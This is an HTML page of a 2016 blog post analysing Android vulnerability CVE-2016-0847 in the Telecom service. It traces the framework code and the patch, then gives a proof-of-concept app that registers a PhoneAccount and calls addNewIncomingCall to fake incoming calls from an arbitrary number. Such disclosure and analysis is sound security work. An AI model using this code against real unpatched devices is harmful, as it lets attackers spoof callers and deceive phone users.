<!DOCTYPE html>
<!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]> <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]> <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Analysis of cve-2016-0847  &middot; Zeqi&#39;s Blog</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1">


<meta name="description" content="Analysis of cve-2016-0847" />

<meta name="keywords" content="Vulnerability, ">


<meta property="og:title" content="Analysis of cve-2016-0847  &middot; Zeqi&#39;s Blog ">
<meta property="og:site_name" content="Zeqi&#39;s Blog"/>
<meta property="og:url" content="https://zeqiii.github.io/2016/04/08/analysis-of-cve-2016-0847/" />
<meta property="og:locale" content="en-EN">


<meta property="og:type" content="article" />
<meta property="og:description" content="Analysis of cve-2016-0847"/>
<meta property="og:article:published_time" content="2016-04-08T15:55:52&#43;08:00" />
<meta property="og:article:modified_time" content="2016-04-08T15:55:52&#43;08:00" />

  
    
<meta property="og:article:tag" content="Vulnerability">
    
  

  
<meta name="twitter:card" content="summary" />
<meta name="twitter:site" content="@" />
<meta name="twitter:creator" content="@" />
<meta name="twitter:title" content="Analysis of cve-2016-0847" />
<meta name="twitter:description" content="Analysis of cve-2016-0847" />
<meta name="twitter:url" content="https://zeqiii.github.io/2016/04/08/analysis-of-cve-2016-0847/" />
<meta name="twitter:domain" content="https://zeqiii.github.io/">
  

<script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "Article",
    "headline": "Analysis of cve-2016-0847",
    "author": {
      "@type": "Person",
      "name": "http://profiles.google.com/+?rel=author"
    },
    "datePublished": "2016-04-08",
    "description": "Analysis of cve-2016-0847",
    "wordCount":  1058 
  }
</script>



<link rel="canonical" href="https://zeqiii.github.io/2016/04/08/analysis-of-cve-2016-0847/" />

<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://zeqiii.github.io/touch-icon-144-precomposed.png">
<link href="https://zeqiii.github.io/favicon.png" rel="icon">

<meta name="generator" content="Hugo 0.15" />

  <!--[if lt IE 9]>
<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
<script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->

<link href='https://fonts.googleapis.com/css?family=Merriweather:300%7CRaleway%7COpen+Sans' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="https://zeqiii.github.io/css/font-awesome.min.css">
<link rel="stylesheet" href="https://zeqiii.github.io/css/style.css">
<link rel="stylesheet" href="https://zeqiii.github.io/css/highlight/default.css">

  
</head>
<body>
  <main id="main-wrapper" class="container main_wrapper has-sidebar">
    <header id="main-header" class="container main_header">
  <div class="container brand">
  <div class="container title h1-like">
  <a class="baselink" href="https://zeqiii.github.io/">
  Zeqi&#39;s Blog

</a>

</div>

  
<div class="container topline">
  

</div>


</div>

  <nav class="container nav primary no-print">
  

<a class="homelink" href="https://zeqiii.github.io/">Home</a>


  
<a href="https://zeqiii.github.io/post" title="Show list of posts">Posts</a>

<a href="https://zeqiii.github.io/tags" title="Show list of tags">Tags</a>

<a href="https://zeqiii.github.io/topics" title="Show list of topics">Topics</a>


</nav>

<div class="container nav secondary no-print">
  
<a id="contact-link-email" class="contact_link" href="mailto:zeqiii@163.com">
  <span class="fa fa-envelope-square"></span><span>email</span></a>



<a id="contact-link-github" class="contact_link" href="https://github.com/zeqiii">
  <span class="fa fa-github-square"></span><span>github</span></a>

















</div>


  

</header>


<article id="main-content" class="container main_content single">
  <header class="container hat">
  <h1>Analysis of cve-2016-0847
</h1>

  <div class="metas">
<time datetime="2016-04-08">8 Apr, 2016</time>


  
    &middot; by zeqi
  
  &middot; Read in about 5 min
  &middot; (1058 Words)
  <br>
  
<a class="label" href="https://zeqiii.github.io/tags/vulnerability">Vulnerability</a>



</div>

</header>

  <div class="container content">
  

<h2 id="introduction">Introduction</h2>

<p>In <a href="https://source.android.com/security/bulletin/2016-04-02.html">Nexus Security Bulletin-April 2016</a>, cve-2016-0847 is disclosed. Let&rsquo;s analysis!</p>

<h2 id="overview-of-telecom">Overview of Telecom</h2>

<p>When a phone call arrives, android framework will send a notification to <code>Telephony</code>. The latter will call function addNewIncomingCall() like this:</p>

<pre><code class="language-java">TelecomManager.from(context).addNewIncomingCall(phoneAccount, extras);
</code></pre>

<p>This somehow equals:</p>

<pre><code class="language-java">TelecomManager telecomManager = (TelecomManager) context.getSystemService(context.TELECOM_SERVICE);
    telecomManager.addNewIncomingCall(phoneAccount, extras);
</code></pre>

<p><code>TelecomManager</code> can be get by <code>context.getSystemService(context.TELECOM_SERVICE)</code>.</p>

<p>Now we should find where telecom service is registered.</p>

<p>Android has a system service named <code>TelecomLoaderService</code> whose function <code>onBootPhase</code> is:</p>

<pre><code class="language-java">@Override
public void onBootPhase(int phase) {
    if (phase == PHASE_ACTIVITY_MANAGER_READY) {
        registerDefaultAppNotifier();
        registerCarrierConfigChangedReceiver();
        connectToTelecom();
    }
}
</code></pre>

<p><code>onBootPhase()</code> is called during booting, it calls another function <code>connectToTelecom()</code>:</p>

<pre><code class="language-java">private static final ComponentName SERVICE_COMPONENT = new ComponentName(
            &quot;com.android.server.telecom&quot;,
            &quot;com.android.server.telecom.components.TelecomService&quot;);

private void connectToTelecom() {
    synchronized (mLock) {
        if (mServiceConnection != null) {
            // TODO: Is unbinding worth doing or wait for system to rebind?
            mContext.unbindService(mServiceConnection);
            mServiceConnection = null;
        }

        TelecomServiceConnection serviceConnection = new TelecomServiceConnect();
        Intent intent = new Intent(SERVICE_ACTION);
        intent.setComponent(SERVICE_COMPONENT);
        int flags = Context.BIND_IMPORTANT | Context.BIND_FOREGROUND_SERVICE
                | Context.BIND_AUTO_CREATE;

        // Bind to Telecom and register the service
        if (mContext.bindServiceAsUser(intent, serviceConnection, flags, UserHandle.OWNER)) {
            mServiceConnection = serviceConnection;
        }
    }
}
</code></pre>

<p>Function <code>connectToTelecom</code> binds a serivce named <code>com.android.server.telecom.components.TelecomService</code>, the ServiceConnection is <code>TelecomServiceConnection</code> whose <code>onServiceConnected()</code> is implemented as:</p>

<pre><code class="language-java">private class TelecomServiceConnection implements ServiceConnection {
    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        // Normally, we would listen for death here, but since telecom runs in the same process
        // as this loader (process=&quot;system&quot;) thats redundant here.
        try {
            service.linkToDeath(new IBinder.DeathRecipient() {
                @Override
                public void binderDied() {
                    connectToTelecom();
                }
            }, 0);
            SmsApplication.getDefaultMmsApplication(mContext, false);
            ServiceManager.addService(Context.TELECOM_SERVICE, service);
    ...
}
</code></pre>

<p>So, when the phone is booting, <code>TelecomLoaderService.onBootPhase()</code> is invoked, it calls function <code>connectToTelecom()</code>. This function binds the service <code>com.android.server.telecom.components.TelecomService</code>. <code>TelecomService.onBind()</code> will return a <code>IBinder</code> object which is the second parameter of <code>onServiceConnected(ComponentName name, IBinder service)</code>. Function <code>onServiceConnected()</code> registers this binder into <code>ServiceManager</code> as the <code>TELECOM_SERVICE</code>.</p>

<p>Here is the <code>onBind()</code> of <code>TelecomService</code>:</p>

<pre><code class="language-java">public IBinder onBind(Intent intent) {
    Log.d(this, &quot;onBind&quot;);
    initializeTelecomSystem(this);
    synchronized (getTelecomSystem().getLock()) {
        return getTelecomSystem().getTelecomServiceImpl().getBinder();
    }
}
</code></pre>

<p><code>getTelecomSystem().getTelecomServiceImpl()</code> returns an object of TelecomServiceImpl. The <code>getBinder()</code> in TelecomServiceImpl is like this:</p>

<pre><code class="language-java">public ITelecomService.Stub getBinder() {
    return mBinderImpl;
}
</code></pre>

<p><code>mBinderImpl</code> is a field of TelecomServiceImpl:</p>

<pre><code class="language-java">private final ITelecomService.Stub mBinderImpl = new ITelecomService.Stub() {
	...
}
</code></pre>

<p><code>mBinderImpl</code> implements the interfaces defined in <code>ITelecomService.aidl</code>, including <code>addNewIncomingCall()</code> and <code>addNewUnknownCall()</code>.</p>

<h2 id="start-from-the-patch">Start from the Patch</h2>

<p>From the <a href="https://android.googlesource.com/platform/packages/services/Telecomm/+/2750faaa1ec819eed9acffea7bd3daf867fda444%5E%21/#F0">patch</a> we can see the fix is in <code>TelecomServiceImple.java</code>:</p>

<ol>
<li>Add a new function <code>enforcePhoneAccountIsRegisteredEnabled</code></li>
<li>After every <code>enforceUserHandleMatchesCaller(phoneAccountHandle)</code>, add the newly added function.</li>
</ol>

<pre><code class="language-java">+    // Enforce that the PhoneAccountHandle being passed in is both registered to the current user
+    // and enabled.
+    private void enforcePhoneAccountIsRegisteredEnabled(PhoneAccountHandle phoneAccountHandle) {
+        PhoneAccount phoneAccount = mPhoneAccountRegistrar.getPhoneAccountCheckCallingUser(
+                phoneAccountHandle);
+        if (phoneAccount == null) {
+            EventLog.writeEvent(0x534e4554, &quot;26864502&quot;, Binder.getCallingUid(), &quot;R&quot;);
+            throw new SecurityException(&quot;This PhoneAccountHandle is not registered for this user!&quot;);
+        }
+        if (!phoneAccount.isEnabled()) {
+            EventLog.writeEvent(0x534e4554, &quot;26864502&quot;, Binder.getCallingUid(), &quot;E&quot;);
+            throw new SecurityException(&quot;This PhoneAccountHandle is not enabled for this user!&quot;);
+        }
+    }
</code></pre>

<p>Let&rsquo;s see <code>getPhoneAccountCheckCallingUser()</code>:</p>

<pre><code class="language-java">public PhoneAccount getPhoneAccountCheckCallingUser(PhoneAccountHandle handle) {
    PhoneAccount account = getPhoneAccount(handle);
    if (account != null &amp;&amp; isVisibleForUser(account)) {
        return account;
    }
    return null;
}
PhoneAccount getPhoneAccount(PhoneAccountHandle handle) {
    for (PhoneAccount m : mState.accounts) {
        if (Objects.equals(handle, m.getAccountHandle())) {
            return m;
        }
    }
    return null;
}
</code></pre>

<p>By invoking <code>TelecomManager.registerPhoneAccount()</code>, one can register a <code>PhoneAccount</code>.</p>

<p>In <code>TelecomServiceImpl.java</code>, there are two fucntions in which  <code>enforceUserHandleMatchesCaller(phoneAccountHandle)</code> is called. (<font color="red"> note: All the code below are not patched </font>)</p>

<pre><code class="language-java"> @Override
public void addNewIncomingCall(PhoneAccountHandle phoneAccountHandle, Bundle extras) {
    synchronized (mLock) {
        if (phoneAccountHandle != null &amp;&amp; phoneAccountHandle.getComponentName() != null) {
           // TODO(sail): Add unit tests for adding incoming calls from a SIM call manager.
            if (isCallerSimCallManager() &amp;&amp; TelephonyUtil.isPstnComponentName(
                    phoneAccountHandle.getComponentName())) {
                Log.v(this, &quot;Allowing call manager to add incoming call with PSTN handle&quot;);
            } else {
                mAppOpsManager.checkPackage(
                        Binder.getCallingUid(),
                        phoneAccountHandle.getComponentName().getPackageName());
                // Make sure it doesn't cross the UserHandle boundary
                enforceUserHandleMatchesCaller(phoneAccountHandle);
            }

            long token = Binder.clearCallingIdentity();
            try {
                Intent intent = new Intent(TelecomManager.ACTION_INCOMING_CALL);
                intent.putExtra(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE,
                    phoneAccountHandle);
                intent.putExtra(CallIntentProcessor.KEY_IS_INCOMING_CALL, true);
                if (extras != null) {
                    intent.putExtra(TelecomManager.EXTRA_INCOMING_CALL_EXTRAS, extras);
                }
                CallIntentProcessor.processIncomingCallIntent(mCallsManager, intent);
            } finally {
                Binder.restoreCallingIdentity(token);
            }
        } else {
            Log.w(this, &quot;Null phoneAccountHandle. Ignoring request to add new incoming call&quot;);
        }
    }
}


@Override
public void addNewUnknownCall(PhoneAccountHandle phoneAccountHandle, Bundle extras) {
    synchronized (mLock) {
        if (phoneAccountHandle != null &amp;&amp; phoneAccountHandle.getComponentName() != null) {
            mAppOpsManager.checkPackage(
                    Binder.getCallingUid(),
                    phoneAccountHandle.getComponentName().getPackageName());

            // Make sure it doesn't cross the UserHandle boundary
            enforceUserHandleMatchesCaller(phoneAccountHandle);
            long token = Binder.clearCallingIdentity();

            try {
                Intent intent = new Intent(TelecomManager.ACTION_NEW_UNKNOWN_CALL);
                intent.putExtras(extras);
                intent.putExtra(CallIntentProcessor.KEY_IS_UNKNOWN_CALL, true);
                intent.putExtra(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE,
                    phoneAccountHandle);
                CallIntentProcessor.processUnknownCallIntent(mCallsManager, intent);
            } finally {
                Binder.restoreCallingIdentity(token);
            }
        } else {
            Log.i(this,&quot;Null phoneAccountHandle or not initiated by Telephony. &quot; +
                            &quot;Ignoring request to add new unknown call.&quot;);
        }
    }
}
</code></pre>

<p>By calling these functions, the attacker can leverage the vulnerability to make calls appear to come from any arbitrary number.</p>

<h2 id="phoneaccounthandle">PhoneAccountHandle</h2>

<p>Then, let&rsquo;s see what is <code>PhoneAccountHandle</code>.</p>

<p><a href="https://developer.android.com/reference/android/telecom/PhoneAccountHandle.html">android.telecom.PhoneAccountHandle</a> is the unique identifier for a <a href="https://developer.android.com/reference/android/telecom/PhoneAccount.html">PhoneAccount</a>, which represents a distinct method to place or receive a phone call. <a href="https://developer.android.com/reference/android/telecom/TelecomManager.html">TelecomManager</a> uses registered PhoneAccounts to present the user with alternative options when placing a phone call. When building a PhoneAccount, the app should supply a valid PhoneAccountHandle that references the connection service implementation Telecom will use to interact with the app.</p>

<pre><code class="language-java">public final class PhoneAccountHandle implements Parcelable {
    private final ComponentName mComponentName;
    private final String mId;
    private final UserHandle mUserHandle;

    public PhoneAccountHandle(
            ComponentName componentName,
            String id) {
        this(componentName, id, Process.myUserHandle());
    }

    public PhoneAccountHandle(
            ComponentName componentName,
            String id,
            UserHandle userHandle) {
        mComponentName = componentName;
        mId = id;
        mUserHandle = userHandle;
    }

    ...

}
</code></pre>

<h2 id="poc">POC</h2>

<p>AOSP provide us an example how to &laquo;make a phone call&raquo;.</p>

<pre><code class="language-java">public static void sendIncomingCallIntent(Context context, Uri handle, boolean isVideoCall) {
    PhoneAccountHandle phoneAccount = new PhoneAccountHandle(
            new ComponentName(context, TestConnectionService.class),
            CallServiceNotifier.SIM_SUBSCRIPTION_ID);
    Bundle extras = new Bundle();
    extras.putBoolean(TestConnectionService.EXTRA_IS_VIDEO_CALL, isVideoCall);
    if (handle != null) {
        extras.putParcelable(TestConnectionService.EXTRA_HANDLE, handle);
    }
    TelecomManager.from(context).addNewIncomingCall(phoneAccount, extras);
}
</code></pre>

<p>Below is our POC:</p>

<p><strong>MainActivity.java</strong></p>

<pre><code class="language-java">public void sendIncomingCallIntent(Context context, Uri handle, boolean isVideoCall) {
    PhoneAccountHandle phoneAccount = new PhoneAccountHandle(
                new ComponentName(this.getApplicationContext(), MyService.class),
                &quot;test&quot;);

    TelecomManager telecomManager = (TelecomManager) context.getSystemService(context.TELECOM_SERVICE);

    // register phone account
    PhoneAccount account = PhoneAccount.builder(phoneAccount, &quot;test&quot;).build();
    telecomManager.registerPhoneAccount(account);

    PhoneAccountHandle thehandle = account.getAccountHandle();

    Bundle extras = new Bundle();
    extras.putBoolean(&quot;extra_is_video_call&quot;, isVideoCall);
    Uri uri = Uri.fromParts(PhoneAccount.SCHEME_TEL, &quot;1234567&quot;, null);
    extras.putParcelable(TelecomManager.EXTRA_INCOMING_CALL_ADDRESS, uri);
    if (handle != null) {
        extras.putParcelable(&quot;extra_handle&quot;, handle);
    }
    telecomManager.addNewIncomingCall(thehandle, extras);
}
</code></pre>

<p><strong>MyService.java</strong></p>

<pre><code class="language-java">public Connection onCreateIncomingConnection(PhoneAccountHandle connectionManagerPhoneAccount, ConnectionRequest request) {
    Log.e(TAG, &quot;onCreateIncomingConnection&quot;);
    Connection connection = createConnectionFor();
    return connection;
}

private Connection createConnectionFor() {
    Connection returnConnection = new Connection() {

    };
    return returnConnection;
}
</code></pre>

<p><strong>AndroidManifest.xml</strong></p>

<pre><code>&lt;service
    android:name=&quot;.MyService&quot;
    android:enabled=&quot;true&quot;
    android:exported=&quot;true&quot;
    android:permission=&quot;android.permission.BIND_TELECOM_CONNECTION_SERVICE&quot;&gt;
    &lt;intent-filter&gt;
        &lt;action android:name=&quot;android.telecom.ConnectionService&quot; /&gt;
    &lt;/intent-filter&gt;
&lt;/service&gt;
</code></pre>

<h2 id="source-code-path">Source Code Path</h2>

<ul>
<li>TelecomService: packages/services/Telecomm/src/com/android/server/telecom/components/TelecomService.java</li>
<li>TelecomLoaderService: frameworks/base/services/core/java/com/android/server/telecom/TelecomLoaderService.java</li>
<li>TelecomServiceImpl: packages/services/Telecomm/src/com/android/server/telecom/TelecomServiceImpl.java</li>
<li>TelecomSystem: packages/services/Telecomm/src/com/android/server/telecom/TelecomSystem.java</li>
<li>ITelecomService.aidl: frameworks/base/services/core/java/com/android/internal/telecom/ITelecomService.aidl</li>
<li>PhoneAccountHandle: frameworks/base/Telecomm/Java/Android/Telecom/PhoneAccountHandle.java</li>
<li>PhoneAccountRegistrar: packages/services/Telecomm/src/com/android/server/telecom/PhoneAccountRegistrar.java</li>
<li>PhoneAccount: frameworks/base/Telecomm/Java/Android/Telecom/PhoneAccount.java</li>
</ul>

</div>


  <footer class="container">
  <div class="container navigation no-print">
  <h2>Navigation</h2>
  
  

    
    <a class="prev" href="https://zeqiii.github.io/2016/03/15/analysis-of-java-serialization/" title="Analysis of Java Serialization">
      Previous
    </a>
    

    

  


</div>

  <div class="container comments">
  <h2>Comments</h2>
  

</div>

</footer>

</article>
      <footer id="main-footer" class="container main_footer">
  

  <div class="container nav foot no-print">
  

  <a class="toplink" href="#">back to top</a>

</div>

  <div class="container credits">
  
<div class="container footline">
  

</div>


  
<div class="container copyright">
  
  &copy; 2016 zeqi


</div>


</div>

</footer>

    </main>
    


<script src="https://zeqiii.github.io/js/highlight.pack.js"></script>
<script>hljs.initHighlightingOnLoad();</script>




    
  </body>
</html>

